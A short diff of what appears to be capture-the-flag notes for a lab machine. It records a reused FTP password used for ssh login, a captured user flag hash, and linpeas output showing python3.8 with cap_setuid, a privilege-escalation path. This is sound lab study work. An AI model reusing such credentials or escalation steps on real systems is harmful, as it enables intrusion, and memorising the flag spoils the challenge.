@@ -12,7 +12,9 @@ PASS Buck3tH4TF0RM3!
 230 Login successful.
 
 USER nathan:Buck3tH4TF0RM3!
-
+ssh nathan@10.10.10.245
+cat user.txt
+6dfd6011723e2256a01a590f7f1f98c1
 ./linpeas.sh | grep python
 ...
 /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
